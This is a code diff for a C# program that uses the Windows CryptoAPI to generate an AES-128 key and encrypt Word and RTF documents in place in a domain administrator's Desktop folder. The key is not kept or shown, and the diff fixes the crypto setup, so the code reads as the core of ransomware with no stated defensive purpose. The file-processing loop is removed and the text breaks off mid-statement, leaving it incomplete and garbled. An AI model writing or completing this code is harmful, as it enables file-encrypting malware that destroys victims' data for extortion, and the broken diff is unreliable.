@@ -166,7 +166,6 @@ class Program
     }
 }
 
-
 using System;
 using System.IO;
 using System.Runtime.InteropServices;
@@ -178,10 +177,17 @@ class Program
     private const uint PAGE_READWRITE = 0x04;
     private const uint FILE_MAP_WRITE = 0x02;
     private const uint FILE_MAP_READ = 0x04;
+    private const int CALG_AES_128 = 0x0000660E; // Numeric value for AES-128 algorithm
 
     // Import required Windows APIs
     [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    public static extern bool CryptAcquireContext(out IntPtr phProv, string pszContainer, string pszProvider, int dwProvType, int dwFlags);
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
     public static extern bool CryptGenKey(IntPtr hProv, int Algid, int dwFlags, out IntPtr phKey);
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    public static extern bool CryptReleaseContext(IntPtr hProv, int dwFlags);
 
     [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
     public static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool Final, int dwFlags, byte[] pbData, ref int pdwDataLen, int dwBufLen);
@@ -209,50 +215,29 @@ class Program
         string directoryPath = @"C:\Users\domain.admin\Desktop";
         string[] fileExtensions = { ".doc", ".docx", ".rtf" };
 
-        // Generate AES-128 key using CryptGenKey
+        // Acquire a cryptographic service provider (CSP) context
         IntPtr hProv = IntPtr.Zero;
+        if (!CryptAcquireContext(out hProv, null, null, 1, 0))
+        {
+            Console.WriteLine("CryptAcquireContext failed.");
+            return;
+        }
+
+        // Generate AES-128 key using CryptGenKey
         IntPtr hKey = IntPtr.Zero;
-        if (!CryptGenKey(hProv, (int)KeyNumber.CALG_AES_128, 0, out hKey))
+        if (!CryptGenKey(hProv, CALG_AES_128, 0, out hKey))
         {
             Console.WriteLine("CryptGenKey failed.");
+            CryptReleaseContext(hProv, 0);
             return;
         }
 
         try
         {
             // Iterate through files in the directory
-            foreach (string fileExtension in fileExtensions)
-            {
-                string[] filePaths = Directory.GetFiles(directoryPath, $"*{fileExtension}");
-                foreach (string filePath in filePaths)
-                {
-                    // Get file handle
-                    IntPtr hFile = CreateFile(filePath, FileAccess.ReadWrite, FileShare.ReadWrite, IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero);
-                    if (hFile == IntPtr.Zero)
-                    {
-                        Console.WriteLine($"Failed to open file: {filePath}");
-                        continue;
-                    }
-
-                    try
-                    {
-                        // Get file size
-                        uint fileSizeLow = GetFileSize(hFile, IntPtr.Zero);
-                        if (fileSizeLow == 0xFFFFFFFF)
-                        {
-                            Console.WriteLine($"Failed to get file size: {filePath}");
-                            continue;
-                        }
-
-                        // Create file mapping
-                        IntPtr hMapping = CreateFileMapping(hFile, IntPtr.Zero, PAGE_READWRITE, 0, fileSizeLow, null);
-                        if (hMapping == IntPtr.Zero)
-                        {
-                            Console.WriteLine($"Failed to create file mapping: {filePath}");
-                           
+            foreach (string
 
 
-
-
-
-
+    
+    
+      
